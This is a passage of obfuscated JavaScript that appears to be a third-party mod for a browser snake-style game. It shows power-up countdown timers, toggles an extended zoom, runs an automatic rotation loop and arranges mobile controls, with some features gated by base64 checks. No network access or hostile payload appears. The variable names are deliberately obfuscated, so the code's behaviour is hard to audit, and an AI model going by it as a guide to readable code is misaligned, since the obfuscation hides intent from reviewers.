            _0x35c40d._lastPulseTime = _0x46bd71;
            _0x35c40d.style.fill = "#FF0000";
            _0x35c40d.style.fontSize = "32px";
            _0x35c40d.style.dropShadow = true;
            _0x35c40d.style.dropShadowColor = "#FF0000";
            _0x35c40d.style.dropShadowDistance = 5;
            _0x35c40d.style.dropShadowBlur = 6;
            setTimeout(() => {
              if (!_0x35c40d || !_0x35c40d.style) {
                return;
              }
              _0x35c40d.style.fill = _0x35c40d._originalColor;
              _0x35c40d.style.fontSize = _0x35c40d._originalFontSize;
              _0x35c40d.style.dropShadow = false;
            }, 400);
          }
        }, 100);
      }
      function _0x57e992(_0x37ae42) {
        if (!_0x37ae42 || !_0x37ae42._pulseStarted) {
          return;
        }
        clearInterval(_0x37ae42._pulseInterval);
        _0x37ae42._pulseInterval = null;
        _0x37ae42._pulseStarted = false;
        if (_0x37ae42._originalColor && _0x37ae42.style) {
          _0x37ae42.style.fill = _0x37ae42._originalColor;
        }
        if (_0x37ae42._originalFontSize && _0x37ae42.style) {
          _0x37ae42.style.fontSize = _0x37ae42._originalFontSize;
        }
        if (_0x37ae42.style) {
          _0x37ae42.style.dropShadow = false;
        }
      }
      window.addEventListener("beforeunload", function () {
        ["pk0", "pk1", "pk2", "pk3", "pk4", "pk5", "pk6"].forEach(_0x352864 => {
          const _0x49dc7c = globalThis.config?.[_0x352864];
          if (_0x49dc7c && _0x49dc7c._pulseStarted) {
            clearInterval(_0x49dc7c._pulseInterval);
          }
        });
      });
      setInterval(_0x142c91, 200);
    }
    let _0x1c7046 = function (_0x1958a2, _0x41799c, _0x516fd0, _0x2b0f69, _0x215e8c, _0x3b76eb) {
      var _0x1f8b7d;
      var _0x5014d4;
      var _0x2bf3c8;
      globalThis.config = _0x41799c;
      _0x712507();
      let _0x5c478a = function (_0x2078f7, _0x8fea0b, _0x5ee28, _0xba5237, _0x153ac9, _0x2ce056, _0x1d7c9e) {
        if (_0x41799c.pk0.text != _0x2078f7) {
          _0x41799c.pk0.text = _0x2078f7;
        }
        if (_0x41799c.pk1.text != _0x8fea0b) {
          _0x41799c.pk1.text = _0x8fea0b;
        }
        if (_0x41799c.pk2.text != _0x5ee28) {
          _0x41799c.pk2.text = _0x5ee28;
        }
        if (_0x41799c.pk3.text != _0xba5237) {
          _0x41799c.pk3.text = _0xba5237;
        }
        if (_0x41799c.pk4.text != _0x153ac9) {
          _0x41799c.pk4.text = _0x153ac9;
        }
        if (_0x41799c.pk5.text != _0x2ce056) {
          _0x41799c.pk5.text = _0x2ce056;
        }
        if (_0x41799c.pk6.text != _0x1d7c9e) {
          _0x41799c.pk6.text = _0x1d7c9e;
        }
      };
      if (_0x516fd0 === "show") {
        _0x1f8b7d = _0x2b0f69;
        _0x5014d4 = _0x215e8c;
        _0x2bf3c8 = _0x3b76eb;
        if (_0x1f8b7d == 0) {
          if (_0x5014d4 == 0 || _0x5014d4 == 1 || _0x5014d4 == 2 || _0x5014d4 == 6) {
            _0x1958a2.pk = 30 - _0x2bf3c8 * 100 * (30 / 99);
            if (_0x1958a2.pk <= 0.1) {
              _0x1958a2.pk0 = "";
            } else {
              _0x1958a2.pk0 = _0x1958a2.pk.toFixed();
            }
            if (_0x5014d4 == 0 && _0x41799c.pk0.style.fill != "#f9cc0b") {
              _0x41799c.pk0.style.fill = "#f9cc0b";
            }
            if (_0x5014d4 == 1 && _0x41799c.pk0.style.fill != "#fdbf5f") {
              _0x41799c.pk0.style.fill = "#fdbf5f";
            }
            if (_0x5014d4 == 2 && _0x41799c.pk0.style.fill != "#5dade6") {
              _0x41799c.pk0.style.fill = "#5dade6";
            }
            if (_0x5014d4 == 6 && _0x41799c.pk0.style.fill != "#e74a94") {
              _0x41799c.pk0.style.fill = "#e74a94";
            }
          }
          if (_0x5014d4 == 3) {
            _0x1958a2.pk = 80 - _0x2bf3c8 * 100 * (80 / 99);
            if (_0x1958a2.pk <= 0.1) {
              _0x1958a2.pk0 = "";
            } else {
              _0x1958a2.pk0 = _0x1958a2.pk.toFixed();
            }
            if (_0x41799c.pk0.style.fill != "#e03e42") {
              _0x41799c.pk0.style.fill = "#e03e42";
            }
          }
          if (_0x5014d4 == 4) {
            _0x1958a2.pk = 40 - _0x2bf3c8 * 100 * (40 / 99);
            if (_0x1958a2.pk <= 0.1) {
              _0x1958a2.pk0 = "";
            } else {
              _0x1958a2.pk0 = _0x1958a2.pk.toFixed();
            }
            if (_0x41799c.pk0.style.fill != "#5dade6") {
              _0x41799c.pk0.style.fill = "#5dade6";
            }
          }
          if (_0x5014d4 == 5) {
            _0x1958a2.pk = 20 - _0x2bf3c8 * 100 * (20 / 99);
            if (_0x1958a2.pk <= 0.1) {
              _0x1958a2.pk0 = "";
            } else {
              _0x1958a2.pk0 = _0x1958a2.pk.toFixed();
            }
            if (_0x41799c.pk0.style.fill != "#d4db19") {
              _0x41799c.pk0.style.fill = "#d4db19";
            }
          }
          _0x1958a2.pk1 = "";
          _0x1958a2.pk2 = "";
          _0x1958a2.pk3 = "";
          _0x1958a2.pk4 = "";
          _0x1958a2.pk5 = "";
          _0x1958a2.pk6 = "";
        }
        if (_0x1f8b7d == 40) {
          if (_0x5014d4 == 0 || _0x5014d4 == 1 || _0x5014d4 == 2 || _0x5014d4 == 6) {
            _0x1958a2.pk = 30 - _0x2bf3c8 * 100 * (30 / 99);
            if (_0x1958a2.pk <= 0.1) {
              _0x1958a2.pk1 = "";
            } else {
              _0x1958a2.pk1 = _0x1958a2.pk.toFixed();
            }
            if (_0x5014d4 == 0 && _0x41799c.pk1.style.fill != "#f9cc0b") {
              _0x41799c.pk1.style.fill = "#f9cc0b";
            }
            if (_0x5014d4 == 1 && _0x41799c.pk1.style.fill != "#fdbf5f") {
              _0x41799c.pk1.style.fill = "#fdbf5f";
            }
            if (_0x5014d4 == 2 && _0x41799c.pk1.style.fill != "#5dade6") {
              _0x41799c.pk1.style.fill = "#5dade6";
            }
            if (_0x5014d4 == 6 && _0x41799c.pk1.style.fill != "#e74a94") {
              _0x41799c.pk1.style.fill = "#e74a94";
            }
          }
          if (_0x5014d4 == 3) {
            _0x1958a2.pk = 80 - _0x2bf3c8 * 100 * (80 / 99);
            if (_0x1958a2.pk <= 0.1) {
              _0x1958a2.pk1 = "";
            } else {
              _0x1958a2.pk1 = _0x1958a2.pk.toFixed();
            }
            if (_0x41799c.pk1.style.fill != "#e03e42") {
              _0x41799c.pk1.style.fill = "#e03e42";
            }
          }
          if (_0x5014d4 == 4) {
            _0x1958a2.pk = 40 - _0x2bf3c8 * 100 * (40 / 99);
            if (_0x1958a2.pk <= 0.1) {
              _0x1958a2.pk1 = "";
            } else {
              _0x1958a2.pk1 = _0x1958a2.pk.toFixed();
            }
            if (_0x41799c.pk1.style.fill != "#5dade6") {
              _0x41799c.pk1.style.fill = "#5dade6";
            }
          }
          if (_0x5014d4 == 5) {
            _0x1958a2.pk = 20 - _0x2bf3c8 * 100 * (20 / 99);
            if (_0x1958a2.pk <= 0.1) {
              _0x1958a2.pk1 = "";
            } else {
              _0x1958a2.pk1 = _0x1958a2.pk.toFixed();
            }
            if (_0x41799c.pk1.style.fill != "#d4db19") {
              _0x41799c.pk1.style.fill = "#d4db19";
            }
          }
          _0x1958a2.pk2 = "";
          _0x1958a2.pk3 = "";
          _0x1958a2.pk4 = "";
          _0x1958a2.pk5 = "";
          _0x1958a2.pk6 = "";
        }
        if (_0x1f8b7d == 80) {
          if (_0x5014d4 == 0 || _0x5014d4 == 1 || _0x5014d4 == 2 || _0x5014d4 == 6) {
            _0x1958a2.pk = 30 - _0x2bf3c8 * 100 * (30 / 99);
            if (_0x1958a2.pk <= 0.1) {
              _0x1958a2.pk2 = "";
            } else {
              _0x1958a2.pk2 = _0x1958a2.pk.toFixed();
            }
            if (_0x5014d4 == 0 && _0x41799c.pk2.style.fill != "#f9cc0b") {
              _0x41799c.pk2.style.fill = "#f9cc0b";
            }
            if (_0x5014d4 == 1 && _0x41799c.pk2.style.fill != "#fdbf5f") {
              _0x41799c.pk2.style.fill = "#fdbf5f";
            }
            if (_0x5014d4 == 2 && _0x41799c.pk2.style.fill != "#5dade6") {
              _0x41799c.pk2.style.fill = "#5dade6";
            }
            if (_0x5014d4 == 6 && _0x41799c.pk2.style.fill != "#e74a94") {
              _0x41799c.pk2.style.fill = "#e74a94";
            }
          }
          if (_0x5014d4 == 3) {
            _0x1958a2.pk = 80 - _0x2bf3c8 * 100 * (80 / 99);
            if (_0x1958a2.pk <= 0.1) {
              _0x1958a2.pk2 = "";
            } else {
              _0x1958a2.pk2 = _0x1958a2.pk.toFixed();
            }
            if (_0x41799c.pk2.style.fill != "#e03e42") {
              _0x41799c.pk2.style.fill = "#e03e42";
            }
          }
          if (_0x5014d4 == 4) {
            _0x1958a2.pk = 40 - _0x2bf3c8 * 100 * (40 / 99);
            if (_0x1958a2.pk <= 0.1) {
              _0x1958a2.pk2 = "";
            } else {
              _0x1958a2.pk2 = _0x1958a2.pk.toFixed();
            }
            if (_0x41799c.pk2.style.fill != "#5dade6") {
              _0x41799c.pk2.style.fill = "#5dade6";
            }
          }
          if (_0x5014d4 == 5) {
            _0x1958a2.pk = 20 - _0x2bf3c8 * 100 * (20 / 99);
            if (_0x1958a2.pk <= 0.1) {
              _0x1958a2.pk2 = "";
            } else {
              _0x1958a2.pk2 = _0x1958a2.pk.toFixed();
            }
            if (_0x41799c.pk2.style.fill != "#d4db19") {
              _0x41799c.pk2.style.fill = "#d4db19";
            }
          }
          _0x1958a2.pk3 = "";
          _0x1958a2.pk4 = "";
          _0x1958a2.pk5 = "";
          _0x1958a2.pk6 = "";
        }
        if (_0x1f8b7d == 120) {
          if (_0x5014d4 == 0 || _0x5014d4 == 1 || _0x5014d4 == 2 || _0x5014d4 == 6) {
            _0x1958a2.pk = 30 - _0x2bf3c8 * 100 * (30 / 99);
            if (_0x1958a2.pk <= 0.1) {
              _0x1958a2.pk3 = "";
            } else {
              _0x1958a2.pk3 = _0x1958a2.pk.toFixed();
            }
            if (_0x5014d4 == 0 && _0x41799c.pk3.style.fill != "#f9cc0b") {
              _0x41799c.pk3.style.fill = "#f9cc0b";
            }
            if (_0x5014d4 == 1 && _0x41799c.pk3.style.fill != "#fdbf5f") {
              _0x41799c.pk3.style.fill = "#fdbf5f";
            }
            if (_0x5014d4 == 2 && _0x41799c.pk3.style.fill != "#5dade6") {
              _0x41799c.pk3.style.fill = "#5dade6";
            }
            if (_0x5014d4 == 6 && _0x41799c.pk3.style.fill != "#e74a94") {
              _0x41799c.pk3.style.fill = "#e74a94";
            }
          }
          if (_0x5014d4 == 3) {
            _0x1958a2.pk = 80 - _0x2bf3c8 * 100 * (80 / 99);
            if (_0x1958a2.pk <= 0.1) {
              _0x1958a2.pk3 = "";
            } else {
              _0x1958a2.pk3 = _0x1958a2.pk.toFixed();
            }
            if (_0x41799c.pk3.style.fill != "#e03e42") {
              _0x41799c.pk3.style.fill = "#e03e42";
            }
          }
          if (_0x5014d4 == 4) {
            _0x1958a2.pk = 40 - _0x2bf3c8 * 100 * (40 / 99);
            if (_0x1958a2.pk <= 0.1) {
              _0x1958a2.pk3 = "";
            } else {
              _0x1958a2.pk3 = _0x1958a2.pk.toFixed();
            }
            if (_0x41799c.pk3.style.fill != "#5dade6") {
              _0x41799c.pk3.style.fill = "#5dade6";
            }
          }
          if (_0x5014d4 == 5) {
            _0x1958a2.pk = 20 - _0x2bf3c8 * 100 * (20 / 99);
            if (_0x1958a2.pk <= 0.1) {
              _0x1958a2.pk3 = "";
            } else {
              _0x1958a2.pk3 = _0x1958a2.pk.toFixed();
            }
            if (_0x41799c.pk3.style.fill != "#d4db19") {
              _0x41799c.pk3.style.fill = "#d4db19";
            }
          }
          _0x1958a2.pk4 = "";
          _0x1958a2.pk5 = "";
          _0x1958a2.pk6 = "";
        }
        if (_0x1f8b7d == 160) {
          if (_0x5014d4 == 0 || _0x5014d4 == 1 || _0x5014d4 == 2 || _0x5014d4 == 6) {
            _0x1958a2.pk = 30 - _0x2bf3c8 * 100 * (30 / 99);
            if (_0x1958a2.pk <= 0.1) {
              _0x1958a2.pk4 = "";
            } else {
              _0x1958a2.pk4 = _0x1958a2.pk.toFixed();
            }
            if (_0x5014d4 == 0 && _0x41799c.pk4.style.fill != "#f9cc0b") {
              _0x41799c.pk4.style.fill = "#f9cc0b";
            }
            if (_0x5014d4 == 1 && _0x41799c.pk4.style.fill != "#fdbf5f") {
              _0x41799c.pk4.style.fill = "#fdbf5f";
            }
            if (_0x5014d4 == 2 && _0x41799c.pk4.style.fill != "#5dade6") {
              _0x41799c.pk4.style.fill = "#5dade6";
            }
            if (_0x5014d4 == 6 && _0x41799c.pk4.style.fill != "#e74a94") {
              _0x41799c.pk4.style.fill = "#e74a94";
            }
          }
          if (_0x5014d4 == 3) {
            _0x1958a2.pk = 80 - _0x2bf3c8 * 100 * (80 / 99);
            if (_0x1958a2.pk <= 0.1) {
              _0x1958a2.pk4 = "";
            } else {
              _0x1958a2.pk4 = _0x1958a2.pk.toFixed();
            }
            if (_0x41799c.pk4.style.fill != "#e03e42") {
              _0x41799c.pk4.style.fill = "#e03e42";
            }
          }
          if (_0x5014d4 == 4) {
            _0x1958a2.pk = 40 - _0x2bf3c8 * 100 * (40 / 99);
            if (_0x1958a2.pk <= 0.1) {
              _0x1958a2.pk4 = "";
            } else {
              _0x1958a2.pk4 = _0x1958a2.pk.toFixed();
            }
            if (_0x41799c.pk4.style.fill != "#5dade6") {
              _0x41799c.pk4.style.fill = "#5dade6";
            }
          }
          if (_0x5014d4 == 5) {
            _0x1958a2.pk = 20 - _0x2bf3c8 * 100 * (20 / 99);
            if (_0x1958a2.pk <= 0.1) {
              _0x1958a2.pk4 = "";
            } else {
              _0x1958a2.pk4 = _0x1958a2.pk.toFixed();
            }
            if (_0x41799c.pk4.style.fill != "#d4db19") {
              _0x41799c.pk4.style.fill = "#d4db19";
            }
          }
          _0x1958a2.pk5 = "";
          _0x1958a2.pk6 = "";
        }
        if (_0x1f8b7d == 200) {
          if (_0x5014d4 == 0 || _0x5014d4 == 1 || _0x5014d4 == 2 || _0x5014d4 == 6) {
            _0x1958a2.pk = 30 - _0x2bf3c8 * 100 * (30 / 99);
            if (_0x1958a2.pk <= 0.1) {
              _0x1958a2.pk5 = "";
            } else {
              _0x1958a2.pk5 = _0x1958a2.pk.toFixed();
            }
            if (_0x5014d4 == 0 && _0x41799c.pk5.style.fill != "#f9cc0b") {
              _0x41799c.pk5.style.fill = "#f9cc0b";
            }
            if (_0x5014d4 == 1 && _0x41799c.pk5.style.fill != "#fdbf5f") {
              _0x41799c.pk5.style.fill = "#fdbf5f";
            }
            if (_0x5014d4 == 2 && _0x41799c.pk5.style.fill != "#5dade6") {
              _0x41799c.pk5.style.fill = "#5dade6";
            }
            if (_0x5014d4 == 6 && _0x41799c.pk5.style.fill != "#e74a94") {
              _0x41799c.pk5.style.fill = "#e74a94";
            }
          }
          if (_0x5014d4 == 3) {
            _0x1958a2.pk = 80 - _0x2bf3c8 * 100 * (80 / 99);
            if (_0x1958a2.pk <= 0.1) {
              _0x1958a2.pk5 = "";
            } else {
              _0x1958a2.pk5 = _0x1958a2.pk.toFixed();
            }
            if (_0x41799c.pk5.style.fill != "#e03e42") {
              _0x41799c.pk5.style.fill = "#e03e42";
            }
          }
          if (_0x5014d4 == 4) {
            _0x1958a2.pk = 40 - _0x2bf3c8 * 100 * (40 / 99);
            if (_0x1958a2.pk <= 0.1) {
              _0x1958a2.pk5 = "";
            } else {
              _0x1958a2.pk5 = _0x1958a2.pk.toFixed();
            }
            if (_0x41799c.pk5.style.fill != "#5dade6") {
              _0x41799c.pk5.style.fill = "#5dade6";
            }
          }
          if (_0x5014d4 == 5) {
            _0x1958a2.pk = 20 - _0x2bf3c8 * 100 * (20 / 99);
            if (_0x1958a2.pk <= 0.1) {
              _0x1958a2.pk5 = "";
            } else {
              _0x1958a2.pk5 = _0x1958a2.pk.toFixed();
            }
            if (_0x41799c.pk5.style.fill != "#d4db19") {
              _0x41799c.pk5.style.fill = "#d4db19";
            }
          }
          _0x1958a2.pk6 = "";
        }
        if (_0x1f8b7d == 240) {
          if (_0x5014d4 == 0 || _0x5014d4 == 1 || _0x5014d4 == 2 || _0x5014d4 == 6) {
            _0x1958a2.pk = 30 - _0x2bf3c8 * 100 * (30 / 99);
            if (_0x1958a2.pk <= 0.1) {
              _0x1958a2.pk6 = "";
            } else {
              _0x1958a2.pk6 = _0x1958a2.pk.toFixed();
            }
            if (_0x5014d4 == 0 && _0x41799c.pk6.style.fill != "#f9cc0b") {
              _0x41799c.pk6.style.fill = "#f9cc0b";
            }
            if (_0x5014d4 == 1 && _0x41799c.pk6.style.fill != "#fdbf5f") {
              _0x41799c.pk6.style.fill = "#fdbf5f";
            }
            if (_0x5014d4 == 2 && _0x41799c.pk6.style.fill != "#5dade6") {
              _0x41799c.pk6.style.fill = "#5dade6";
            }
            if (_0x5014d4 == 6 && _0x41799c.pk6.style.fill != "#e74a94") {
              _0x41799c.pk6.style.fill = "#e74a94";
            }
          }
          if (_0x5014d4 == 3) {
            _0x1958a2.pk = 80 - _0x2bf3c8 * 100 * (80 / 99);
            if (_0x1958a2.pk <= 0.1) {
              _0x1958a2.pk6 = "";
            } else {
              _0x1958a2.pk6 = _0x1958a2.pk.toFixed();
            }
            if (_0x41799c.pk6.style.fill != "#e03e42") {
              _0x41799c.pk6.style.fill = "#e03e42";
            }
          }
          if (_0x5014d4 == 4) {
            _0x1958a2.pk = 40 - _0x2bf3c8 * 100 * (40 / 99);
            if (_0x1958a2.pk <= 0.1) {
              _0x1958a2.pk6 = "";
            } else {
              _0x1958a2.pk6 = _0x1958a2.pk.toFixed();
            }
            if (_0x41799c.pk6.style.fill != "#5dade6") {
              _0x41799c.pk6.style.fill = "#5dade6";
            }
          }
          if (_0x5014d4 == 5) {
            _0x1958a2.pk = 20 - _0x2bf3c8 * 100 * (20 / 99);
            if (_0x1958a2.pk <= 0.1) {
              _0x1958a2.pk6 = "";
            } else {
              _0x1958a2.pk6 = _0x1958a2.pk.toFixed();
            }
            if (_0x41799c.pk6.style.fill != "#d4db19") {
              _0x41799c.pk6.style.fill = "#d4db19";
            }
          }
        }
        _0x5c478a(_0x1958a2.pk0, _0x1958a2.pk1, _0x1958a2.pk2, _0x1958a2.pk3, _0x1958a2.pk4, _0x1958a2.pk5, _0x1958a2.pk6);
      }
      if (_0x516fd0 === "hidden") {
        _0x1958a2.pk0 = "";
        _0x1958a2.pk1 = "";
        _0x1958a2.pk2 = "";
        _0x1958a2.pk3 = "";
        _0x1958a2.pk4 = "";
        _0x1958a2.pk5 = "";
        _0x1958a2.pk6 = "";
        _0x5c478a(_0x1958a2.pk0, _0x1958a2.pk1, _0x1958a2.pk2, _0x1958a2.pk3, _0x1958a2.pk4, _0x1958a2.pk5, _0x1958a2.pk6);
      }
      localStorage.setItem("SaveGameup", JSON.stringify(_0x1958a2));
    };
    let _0xe80c4e = function () {
      clearInterval(_0x18dfde);
      _0x18dfde = null;
      _0x18dfde = setInterval(function () {
        var _0x432c0f = _0x5c2dcc.eie.fo;
        let _0x1524ca = Math.PI;
        var _0x38a173 = _0x432c0f + _0x1524ca / 360 * 9;
        if (_0x38a173 >= _0x1524ca) {
          _0x38a173 = -_0x432c0f;
        }
        _0x5c2dcc.eie.fo = _0x38a173;
      }, 55);
    };
    let _0x4aea5b = function () {
      if (_0xb42c97 >= 40) {
        if (_0x13b8e7) {
          _0x38aca6 += 25;
        } else {
          _0x38aca6 -= 200;
        }
        _0xb42c97 = 1;
      }
    };
    let _0x4fc338 = function () {
      if (_0x38aca6 == 55 && _0xb42c97 >= 40) {
        _0x38aca6 += 25;
        _0xb42c97 = 1;
        _0x13b8e7 = true;
      }
      if (_0x38aca6 == 80) {
        _0x4aea5b();
      }
      if (_0x38aca6 == 105) {
        _0x4aea5b();
      }
      if (_0x38aca6 == 130) {
        _0x4aea5b();
      }
      if (_0x38aca6 == 155) {
        _0x4aea5b();
      }
      if (_0x38aca6 == 180) {
        _0x4aea5b();
      }
      if (_0x38aca6 == 205) {
        _0x4aea5b();
      }
      if (_0x38aca6 == 230) {
        _0x4aea5b();
      }
      if (_0x38aca6 == 255) {
        _0x4aea5b();
      }
      if (_0x38aca6 == 280) {
        _0x4aea5b();
      }
      if (_0x38aca6 == 305) {
        _0x4aea5b();
      }
      if (_0x38aca6 == 330) {
        _0x4aea5b();
      }
      if (_0x38aca6 == 355) {
        _0x4aea5b();
      }
      if (_0x38aca6 == 380) {
        _0x4aea5b();
      }
      if (_0x38aca6 == 405) {
        _0x4aea5b();
      }
      if (_0x38aca6 == 430) {
        _0x4aea5b();
      }
      if (_0x38aca6 == 455 && _0xb42c97 >= 40) {
        _0x38aca6 -= 200;
        _0xb42c97 = 1;
        _0x13b8e7 = false;
      }
    };
    let _0x589e7e = function () {
      clearInterval(_0x18dfde);
      _0x18dfde = null;
      {
        var _0x5e1eab = _0x5c2dcc.eie.fo;
        let _0x379497 = Math.PI;
        var _0x39a804 = _0x5e1eab + _0x379497 / 360 * 9;
        if (_0x39a804 >= _0x379497) {
          _0x39a804 = -_0x5e1eab;
        }
        _0x5c2dcc.eie.fo = _0x39a804;
        _0xb42c97 += 1;
        _0x4fc338();
        if (_0x33e15a) {
          _0x18dfde = setInterval(_0x589e7e, _0x38aca6);
        }
      }
    };
    let _0x500615 = function () {
      clearInterval(_0x8a94c9);
      _0x8a94c9 = null;
      if (_0x5c2dcc.on) {
        var _0x1e293e = btoa(_0x207b06.c_1);
        if (_0x207b06.ig != -1 && btoa(_0x1e293e) == _0x207b06.d_1) {
          var _0x2927d4 = ooo;
          var _0x5017c4 = _0x207b06.sg.indexOf(_0x5c2dcc.n.ni);
          var _0x345630 = btoa(_0x207b06.c_2);
          if (btoa(_0x345630) == _0x207b06.d_2) {
            _0x5c2dcc.uj.hd(_0x2927d4.Mh.Qh.eh, _0x2927d4.ud.Cc().Ub(_0x5c2dcc.n.mi), _0x2927d4.ud.Cc().Tb(_0x207b06.ig), _0x2927d4.ud.Cc().Vb(_0x5c2dcc.n.Vi), _0x2927d4.ud.Cc().Wb(_0x5c2dcc.n.Wi), _0x2927d4.ud.Cc().Xb(_0x5c2dcc.n.Xi), _0x2927d4.ud.Cc().Yb(_0x5c2dcc.n.Yi), "#ffffff");
          }
          if (_0x207b06.gg[_0x5017c4].r) {
            if (_0x207b06.re) {
              _0x207b06.ig = _0x207b06.ig - 1;
              if (_0x207b06.ig < _0x207b06.gg[_0x5017c4].s) {
                _0x207b06.ig = _0x207b06.gg[_0x5017c4].s + 1;
                _0x207b06.re = false;
              }
            } else {
              _0x207b06.ig = _0x207b06.ig + 1;
              if (_0x207b06.ig > _0x207b06.gg[_0x5017c4].e) {
                _0x207b06.ig = _0x207b06.gg[_0x5017c4].e - 1;
                _0x207b06.re = true;
              }
            }
          } else {
            _0x207b06.ig = _0x207b06.ig + 1;
            if (_0x207b06.ig > _0x207b06.gg[_0x5017c4].e) {
              _0x207b06.ig = _0x207b06.gg[_0x5017c4].s;
            }
          }
          var _0x5ca0ca = btoa(_0x207b06.c_3);
          if (btoa(_0x5ca0ca) == _0x207b06.d_3) {
            _0x8a94c9 = setInterval(_0x500615, _0x207b06.gg[_0x5017c4].t);
          }
        }
      }
    };
    let _0x39f098 = function () {
      _0x33e15a = true;
      _0x38aca6 = 55;
      _0xb42c97 = 1;
      _0x13b8e7 = true;
      _0x589e7e();
    };
    let _0x59132f = function () {
      if (_0xfa7e1.texture == _0x548fe1) {
        _0xfa7e1.texture = _0x1a4670;
        _0xfa7e1.alpha = 1;
        _0x2e32b4.texture = _0x4de304;
        _0x2e32b4.alpha = 0.25;
        _0x33e15a = false;
        _0x38aca6 = 55;
        _0xb42c97 = 1;
        _0x13b8e7 = true;
        clearInterval(_0x18dfde);
        _0x18dfde = null;
        _0xe80c4e();
      } else {
        _0xfa7e1.texture = _0x548fe1;
        _0xfa7e1.alpha = 0.25;
        clearInterval(_0x18dfde);
        _0x18dfde = null;
      }
    };
    let _0x430cb9 = function () {
      if (_0x2e32b4.texture == _0x4de304) {
        _0x2e32b4.texture = _0x80766b;
        _0x2e32b4.alpha = 1;
        _0xfa7e1.texture = _0x548fe1;
        _0xfa7e1.alpha = 0.25;
        clearInterval(_0x18dfde);
        _0x18dfde = null;
        _0x33e15a = true;
        _0x38aca6 = 55;
        _0xb42c97 = 1;
        _0x13b8e7 = true;
        _0x589e7e();
      } else {
        _0x2e32b4.texture = _0x4de304;
        _0x2e32b4.alpha = 0.25;
        _0x33e15a = false;
        _0x38aca6 = 55;
        _0xb42c97 = 1;
        _0x13b8e7 = true;
        clearInterval(_0x18dfde);
        _0x18dfde = null;
      }
    };
    let _0x1eba92 = function () {
      if (_0x314f33.texture == _0x4e187f) {
        _0x314f33.texture = _0x6c8187;
        _0x314f33.alpha = 1;
        if (_0x207b06.h) {
          _0x207b06.z = 1.6;
        } else {
          _0x207b06.z = 1.2;
        }
      } else {
        _0x314f33.texture = _0x4e187f;
        _0x314f33.alpha = 0.25;
        _0x207b06.z = 1;
      }
    };
    let _0x3001a1 = function () {
      if (_0x5c2dcc.on && _0x207b06.mobile) {
        var _0x1b49b3 = _0x41ed0b.offsetWidth;
        var _0x45305d = _0x41ed0b.offsetHeight;
        var _0x3a38f4 = ooo.Xg.Kf.Wg.Ah;
        if (_0x207b06.mo == 1) {
          _0x207b06.mo = 6;
          _0x207b06.j = _0x431976(_0x207b06.mobile);
          _0x3a38f4.img_1.visible = false;
          _0x3a38f4.img_p_1.visible = false;
          _0x3a38f4.img_4.visible = true;
        } else if (_0x207b06.mo == 6) {
          _0x207b06.mo = 4;
          _0x3a38f4.img_o_4.visible = true;
          _0x3a38f4.img_o_4.x = 50;
          _0x3a38f4.img_o_4.y = -220 + _0x45305d;
          _0x3a38f4.img_p_2.visible = true;
          _0x3a38f4.img_p_2.x = -68 + _0x1b49b3 * 0.5;
          _0x3a38f4.img_p_2.y = -68 + _0x45305d * 0.5;
          _0x3a38f4.img_f.visible = true;
          _0x3a38f4.img_f.x = -250 + _0x1b49b3;
          _0x3a38f4.img_f.y = -200 + _0x45305d;
          _0x3a38f4.img_pf_1.visible = false;
          if (_0x207b06.j) {
            _0x207b06.j.destroy();
          }
        } else if (_0x207b06.mo == 4) {
          _0x207b06.mo = 5;
          _0x3a38f4.img_o_4.x = -270 + _0x1b49b3;
          _0x3a38f4.img_o_4.y = -220 + _0x45305d;
          _0x3a38f4.img_p_2.x = -68 + _0x1b49b3 * 0.5;
          _0x3a38f4.img_p_2.y = -68 + _0x45305d * 0.5;
          _0x3a38f4.img_f.x = 50;
          _0x3a38f4.img_f.y = -200 + _0x45305d;
        } else if (_0x207b06.mo == 5) {
          _0x207b06.mo = 2;
          _0x3a38f4.img_4.visible = false;
          _0x3a38f4.img_o_4.visible = false;
          _0x3a38f4.img_2.visible = true;
          _0x3a38f4.img_o_2.visible = true;
          _0x3a38f4.img_o_2.x = 50;
          _0x3a38f4.img_o_2.y = -220 + _0x45305d;
          _0x3a38f4.img_i_2.visible = true;
          _0x3a38f4.img_i_2.x = 75;
          _0x3a38f4.img_i_2.y = -195 + _0x45305d;
          _0x3a38f4.img_p_2.visible = true;
          _0x3a38f4.img_p_2.x = -68 + _0x1b49b3 * 0.5;
          _0x3a38f4.img_p_2.y = -68 + _0x45305d * 0.5;
          _0x3a38f4.img_f.visible = false;
          _0x3a38f4.img_pf_1.visible = false;
        } else if (_0x207b06.mo == 2) {
          _0x207b06.mo = 3;
          _0x3a38f4.img_2.visible = false;
          _0x3a38f4.img_o_2.visible = false;
          _0x3a38f4.img_i_2.visible = false;
          _0x3a38f4.img_p_2.visible = false;
          _0x3a38f4.img_3.visible = true;
          _0x3a38f4.img_o_3.visible = true;
          _0x3a38f4.img_o_3.x = 50;
          _0x3a38f4.img_o_3.y = -220 + _0x45305d;
          _0x3a38f4.img_i_3.visible = true;
          _0x3a38f4.img_i_3.x = 75;
          _0x3a38f4.img_i_3.y = -195 + _0x45305d;
          _0x3a38f4.img_p_3.visible = true;
          _0x3a38f4.img_p_3.x = -68 + _0x1b49b3 * 0.5;
          _0x3a38f4.img_p_3.y = -68 + _0x45305d * 0.5;
          _0x3a38f4.img_pf_1.visible = false;
        } else if (_0x207b06.mo == 3) {
          _0x207b06.mo = 1;
          _0x3a38f4.img_1.visible = true;
          _0x3a38f4.img_p_1.visible = true;
          _0x3a38f4.img_3.visible = false;
          _0x3a38f4.img_o_3.visible = false;
          _0x3a38f4.img_i_3.visible = false;
          _0x3a38f4.img_p_3.visible = false;
          _0x3a38f4.img_f.visible = false;
          _0x3a38f4.img_pf_1.visible = false;
        }
      }
    };
    let _0x183d07 = function () {
      if (_0x5c2dcc.on && _0x207b06.mobile) {
        var _0x405cad = ooo.Xg.Kf.Wg.Ah;
        var _0x4e8187 = _0x41ed0b.offsetHeight * 0.5;
        var _0x54fce8 = _0x41ed0b.offsetWidth * 0.5;
        _0x405cad.img_1.x = -100 + _0x54fce8;
        _0x405cad.img_1.y = -60;
        _0x405cad.img_2.x = -100 + _0x54fce8;
        _0x405cad.img_2.y = -60;
        _0x405cad.img_3.x = -100 + _0x54fce8;
        _0x405cad.img_3.y = -60;
        _0x405cad.img_4.x = -100 + _0x54fce8;
        _0x405cad.img_4.y = -60;
        if (_0x207b06.mo == 1) {
          _0x405cad.img_p_1.alpha = 0.25;
          _0x405cad.img_p_1.x = _0x54fce8 - 68;
          _0x405cad.img_p_1.y = _0x4e8187 - 68;
        }
        if (_0x207b06.mo == 2) {
          _0x405cad.img_o_2.alpha = 0.25;
          _0x405cad.img_o_2.x = 50;
